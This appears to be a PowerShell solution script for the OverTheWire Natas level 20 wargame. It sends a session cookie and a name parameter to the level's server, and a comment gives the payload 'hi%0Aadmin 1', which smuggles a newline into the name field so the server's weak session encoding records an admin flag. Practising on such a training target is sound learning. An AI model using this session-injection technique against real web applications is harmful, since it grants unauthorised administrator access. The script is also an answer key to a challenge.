param (
    [string]$sessionStr,
    [string]$name
)

$server = "natas20.......overthewire.org" 
#$server = "localhost:8000"


$url = "http://$server/index.php?debug&name="

#solution is like this: "hi%0Aadmin 1"
#"hi"->puts something in name. "%0A"->is a newline character "admin 1"-> after the newline character, abuse the poor encoding
if ($name) {
     $url += $name
} else {
    $url += ''
}

$username = ""
$password = ""

$pair = "${username}:${password}"
$bytes = [System.Text.Encoding]::ASCII.GetBytes($pair)
$base64 = [System.Convert]::ToBase64String($bytes)
$authorization = "Basic $base64"

$headers = @{
    "Authorization" = $authorization
    "Content-Type"  = "application/x-www-form-urlencoded"
}

$commandurl = $url;

$cookieContainer = New-Object System.Net.CookieContainer

$cookie = New-Object System.Net.Cookie("PHPSESSID", $sessionStr, "/", $server)
$cookieContainer.Add($cookie)
    
$requestSession = New-Object Microsoft.PowerShell.Commands.WebRequestSession;
$requestSession.Cookies = $cookieContainer;

$commandurl = $url;
$response = Invoke-WebRequest -Headers $headers -URI $commandurl -WebSession $requestSession;

#i should use this in every of these previous levels
$filtered = ((($response.Content -replace "<br>", "`n") -split "`n") | Where-Object { $_ -notmatch "<|>" }) -join "`n"
Write-Host $filtered

Write-Host (((($response.Content -replace "<br>", "`n") -split "`n") | Where-Object { $_ -match 'our name: <input name="name" value="' }) -join "`n")